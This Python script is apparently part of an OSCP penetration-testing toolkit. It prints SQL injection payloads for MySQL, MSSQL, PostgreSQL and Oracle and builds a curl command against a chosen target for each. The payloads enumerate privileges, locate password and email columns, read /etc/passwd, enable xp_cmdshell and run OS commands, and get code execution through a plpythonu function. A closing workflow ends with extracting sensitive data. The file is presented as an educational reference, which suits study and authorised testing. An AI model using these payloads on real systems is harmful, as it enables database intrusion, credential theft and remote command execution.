#!/usr/bin/env python3
"""
SQL Injection Follow-Up Commands Reference Tool
Educational reference for post-exploitation enumeration techniques
"""

import argparse
import sys
from urllib.parse import urlparse, quote

# Import from the modular SQLi scanner
try:
    from sqli.databases import DatabaseEnumeration
    from ..utils.colors import Colors
except ImportError:
    # Fallback for standalone execution
    sys.path.insert(0, '/home/kali/OSCP')
    try:
        from crack.enumeration.sqli.databases import DatabaseEnumeration
        from crack.utils.colors import Colors
    except ImportError:
        # Ultimate fallback - define Colors locally
        class Colors:
            HEADER = '\033[95m'
            BLUE = '\033[94m'
            GREEN = '\033[92m'
            YELLOW = '\033[93m'
            RED = '\033[91m'
            CYAN = '\033[96m'
            BOLD = '\033[1m'
            END = '\033[0m'


class SqliFu:
    def __init__(self, db_type=None, target=None, param=None, category=None):
        self.db_type = db_type.lower() if db_type else 'all'
        self.target = target or 'http://target.com/page.php'
        self.param = param or 'id'
        self.category = category.lower() if category else None

        # Try to use existing DatabaseEnumeration if available
        try:
            from crack.enumeration.sqli.databases import DatabaseEnumeration
            self.db_enum = DatabaseEnumeration
            self.use_integrated = True
        except ImportError:
            self.db_enum = None
            self.use_integrated = False

        # Fallback database-specific payloads
        self.databases = {
            'mysql': self._get_mysql_payloads(),
            'mssql': self._get_mssql_payloads(),
            'postgresql': self._get_postgresql_payloads(),
            'oracle': self._get_oracle_payloads()
        }

    def _get_mysql_payloads(self):
        """MySQL-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS int)--"),
                ("Count Current DB Tables", "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) AS int)--"),
                ("Count Users", "' AND 1=CAST((SELECT COUNT(DISTINCT user) FROM mysql.user) AS int)--"),
                ("Count Rows in Table", "' AND 1=CAST((SELECT COUNT(*) FROM TABLENAME) AS int)--")
            ],
            'privileges': [
                ("Current User Privileges", "' AND 1=CAST((SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\")) AS int)--"),
                ("Check FILE Privilege", "' AND IF((SELECT COUNT(*) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\") AND privilege_type='FILE')>0, 1=CAST('has_file' AS int), 1)--"),
                ("Check SUPER Privilege", "' AND IF((SELECT COUNT(*) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\") AND privilege_type='SUPER')>0, 1=CAST('is_super' AS int), 1)--")
            ],
            'sensitive': [
                ("Find User Tables", "' AND 1=CAST((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND (table_name LIKE '%user%' OR table_name LIKE '%admin%')) AS int)--"),
                ("Find Password Columns", "' AND 1=CAST((SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%pass%') AS int)--"),
                ("Find Email Columns", "' AND 1=CAST((SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%email%') AS int)--")
            ],
            'advanced': [
                ("Read /etc/passwd", "' AND 1=CAST((SELECT LOAD_FILE('/etc/passwd')) AS int)--"),
                ("Database Write Directory", "' AND 1=CAST((SELECT @@secure_file_priv) AS int)--"),
                ("Full Version Info", "' AND 1=CAST((SELECT CONCAT(@@version,':',@@version_compile_os,':',@@hostname)) AS int)--")
            ]
        }

    def _get_mssql_payloads(self):
        """MSSQL-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "'; SELECT CAST(COUNT(*) AS int) FROM information_schema.tables--"),
                ("Count Databases", "'; SELECT CAST(COUNT(*) AS int) FROM sys.databases--"),
                ("Count Logins", "'; SELECT CAST(COUNT(*) AS int) FROM sys.sql_logins--")
            ],
            'privileges': [
                ("Server Permissions", "'; SELECT CAST(permission_name AS int) FROM fn_my_permissions(NULL, 'SERVER')--"),
                ("Check sysadmin", "'; IF IS_SRVROLEMEMBER('sysadmin')=1 SELECT CAST('is_sysadmin' AS int)--"),
                ("Check xp_cmdshell", "'; SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name='xp_cmdshell'--")
            ],
            'sensitive': [
                ("Find User Tables", "'; SELECT CAST(STRING_AGG(name,',') AS int) FROM sys.tables WHERE name LIKE '%user%'--"),
                ("Find Password Columns", "'; SELECT CAST(STRING_AGG(t.name+'.'+c.name,',') AS int) FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE c.name LIKE '%pass%'--")
            ],
            'advanced': [
                ("Enable xp_cmdshell", "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"),
                ("Execute OS Command", "'; EXEC xp_cmdshell 'whoami'--")
            ]
        }

    def _get_postgresql_payloads(self):
        """PostgreSQL-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables)::int AS int)--"),
                ("Count Databases", "' AND 1=CAST((SELECT COUNT(*) FROM pg_database)::int AS int)--"),
                ("Count Roles", "' AND 1=CAST((SELECT COUNT(*) FROM pg_roles)::int AS int)--")
            ],
            'privileges': [
                ("Check Superuser", "' AND 1=CAST((SELECT usesuper FROM pg_user WHERE usename=current_user)::int AS int)--"),
                ("User Privileges", "' AND 1=CAST((SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user)::int AS int)--"),
                ("File Read Access", "' AND 1=CAST((SELECT has_function_privilege(current_user, 'pg_read_file(text)', 'execute'))::int AS int)--")
            ],
            'sensitive': [
                ("Find User Tables", "' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE tablename LIKE '%user%')::int AS int)--"),
                ("Find Password Columns", "' AND 1=CAST((SELECT string_agg(table_name||'.'||column_name,',') FROM information_schema.columns WHERE column_name LIKE '%pass%')::int AS int)--")
            ],
            'advanced': [
                ("Read Files", "' AND 1=CAST((SELECT pg_read_file('/etc/passwd'))::int AS int)--"),
                ("List Extensions", "' AND 1=CAST((SELECT string_agg(extname,',') FROM pg_extension)::int AS int)--"),
                ("RCE via plpython", "'; CREATE FUNCTION cmd(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu; SELECT cmd('id')--")
            ]
        }

    def _get_oracle_payloads(self):
        """Oracle-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "' AND 1=(SELECT COUNT(*) FROM all_tables)--"),
                ("Count Users", "' AND 1=(SELECT COUNT(*) FROM all_users)--")
            ],
            'privileges': [
                ("System Privileges", "' AND 1=(SELECT LISTAGG(privilege,',') WITHIN GROUP (ORDER BY privilege) FROM user_sys_privs)--"),
                ("Check DBA Role", "' AND 1=(SELECT DECODE(COUNT(*),0,1,1/0) FROM user_role_privs WHERE granted_role='DBA')--")
            ],
            'sensitive': [
                ("Find User Tables", "' AND 1=(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE table_name LIKE '%USER%')--")
            ],
            'advanced': [
                ("Java Version", "' AND 1=(SELECT dbms_java.get_ojvm_property('java.version') FROM dual)--")
            ]
        }

    def generate_curl_command(self, payload):
        """Generate curl command for the payload"""
        encoded = quote(payload)
        return f"curl \"{self.target}?{self.param}={encoded}\""

    def display_category(self, db_name, category_name, payloads):
        """Display payloads for a specific category"""
        category_display = {
            'counting': 'Counting Operations',
            'privileges': 'Privilege Enumeration',
            'sensitive': 'Sensitive Data Discovery',
            'advanced': 'Advanced Enumeration'
        }

        print(f"\n{Colors.YELLOW}[{category_display.get(category_name, category_name.upper())}]{Colors.END}")
        print("-" * 60)

        for title, payload in payloads:
            print(f"\n  {Colors.CYAN}• {title}{Colors.END}")
            print(f"    {Colors.BOLD}Payload:{Colors.END} {payload}")

            # Show curl command
            curl_cmd = self.generate_curl_command(payload)
            print(f"    {Colors.BOLD}Command:{Colors.END}")
            print(f"    {curl_cmd}")

            # Add helpful notes
            if "TABLENAME" in payload:
                print(f"    {Colors.YELLOW}Note: Replace TABLENAME with actual table name{Colors.END}")
            if "OFFSET" in payload:
                print(f"    {Colors.YELLOW}Note: Increment OFFSET to enumerate all results{Colors.END}")

    def display_integrated_commands(self):
        """Display commands using the integrated DatabaseEnumeration module"""
        databases = ['mysql', 'mssql', 'postgresql', 'oracle'] if self.db_type == 'all' else [self.db_type]

        for db in databases:
            if self.db_type == 'all':
                print(f"\n{Colors.BOLD}{Colors.BLUE}═══ {db.upper()} DATABASE ═══{Colors.END}")

            # Get follow-up commands from the integrated module
            commands = self.db_enum.get_followup_commands(
                db, self.param, 'GET', self.target, None
            )

            # Filter by category if specified
            if self.category:
                category_map = {
                    'counting': 'Counting Operations',
                    'privileges': 'Privilege Enumeration',
                    'sensitive': 'Sensitive Data Discovery',
                    'advanced': 'Advanced Enumeration'
                }
                category_name = category_map.get(self.category)
                if category_name in commands:
                    commands = {category_name: commands[category_name]}
                else:
                    print(f"\n{Colors.RED}Category '{self.category}' not found for {db}{Colors.END}")
                    continue

            # Display commands
            for category, cmd_list in commands.items():
                print(f"\n{Colors.YELLOW}[{category}]{Colors.END}")
                print("-" * 60)

                for cmd in cmd_list:
                    print(f"\n  {Colors.CYAN}• {cmd['title']}{Colors.END}")
                    print(f"    {Colors.BLUE}Purpose:{Colors.END} {cmd['description']}")
                    print(f"    {Colors.BOLD}Command:{Colors.END}")
                    print(f"    {Colors.GREEN}{cmd['curl']}{Colors.END}")
                    print(f"    {Colors.YELLOW}Look for:{Colors.END} {cmd['look_for']}")

                    if cmd.get('requires_input'):
                        print(f"    {Colors.RED}⚠ Replace:{Colors.END} {cmd['requires_input']} with actual value")

    def generate_report(self):
        """Display the SQLi enumeration reference"""
        print(f"\n{Colors.BOLD}{Colors.GREEN}[SQL INJECTION FOLLOW-UP ENUMERATION]{Colors.END}")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Parameter: {self.param}")
        print(f"Database Type: {self.db_type.upper() if self.db_type != 'all' else 'ALL'}")

        # Use integrated module if available
        if self.use_integrated:
            self.display_integrated_commands()
        else:
            # Use fallback payloads
            databases_to_show = self.databases.keys() if self.db_type == 'all' else [self.db_type]

            if self.db_type not in self.databases and self.db_type != 'all':
                print(f"\n{Colors.RED}Unknown database type: {self.db_type}{Colors.END}")
                print("Supported: mysql, mssql, postgresql, oracle")
                return

            for db in databases_to_show:
                if self.db_type == 'all':
                    print(f"\n{Colors.BOLD}{Colors.BLUE}═══ {db.upper()} DATABASE ═══{Colors.END}")

                db_payloads = self.databases[db]

                if self.category:
                    if self.category in db_payloads:
                        self.display_category(db, self.category, db_payloads[self.category])
                    else:
                        print(f"\n{Colors.RED}Unknown category: {self.category}{Colors.END}")
                        print("Available: counting, privileges, sensitive, advanced")
                else:
                    for cat_name, cat_payloads in db_payloads.items():
                        self.display_category(db, cat_name, cat_payloads)

        # Summary tips
        print(f"\n{Colors.BOLD}[EXPLOITATION TIPS]{Colors.END}")
        print("-" * 60)
        print("  • Error-based: Look for database errors in response")
        print("  • Blind: Use boolean conditions and time delays")
        print("  • Union-based: Match column count first")
        print("  • Always URL-encode special characters in GET requests")
        print("  • Use -X POST for POST parameter injection")

        print(f"\n{Colors.BOLD}[MANUAL TESTING WORKFLOW]{Colors.END}")
        print("-" * 60)
        print("  1. Identify database type via error messages")
        print("  2. Extract current user and database name")
        print("  3. Check privilege level (FILE, SUPER, DBA, etc.)")
        print("  4. Enumerate tables and columns")
        print("  5. Extract sensitive data")
        print("  6. Attempt advanced techniques if privileges allow")


def main():
    parser = argparse.ArgumentParser(
        description='SQLi-Fu - SQL Injection Follow-Up Enumeration Reference',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  crack sqli-fu                                     # Show all databases
  crack sqli-fu mysql                               # MySQL payloads only
  crack sqli-fu mssql -c privileges                 # MSSQL privilege checks
  crack sqli-fu postgresql -t http://10.10.10.1/page.php -p user_id
  crack sqli-fu oracle -c advanced                  # Oracle RCE payloads

Database Types:
  mysql, mssql, postgresql, oracle, all

Categories:
  counting     - Count tables, users, rows
  privileges   - Check user permissions
  sensitive    - Find credential columns
  advanced     - File read, RCE attempts
        """
    )

    parser.add_argument('database', nargs='?', default='all',
                       choices=['mysql', 'mssql', 'postgresql', 'oracle', 'all'],
                       help='Database type (default: all)')
    parser.add_argument('-t', '--target',
                       help='Target URL (default: http://target.com/page.php)')
    parser.add_argument('-p', '--param',
                       help='Vulnerable parameter name (default: id)')
    parser.add_argument('-c', '--category',
                       choices=['counting', 'privileges', 'sensitive', 'advanced'],
                       help='Show specific category only')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Show detailed explanations')

    args = parser.parse_args()

    try:
        # Create and run the tool
        tool = SqliFu(
            db_type=args.database,
            target=args.target,
            param=args.param,
            category=args.category
        )
        tool.generate_report()

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Reference lookup interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Error: {e}{Colors.END}")
        sys.exit(1)


if __name__ == '__main__':
    main()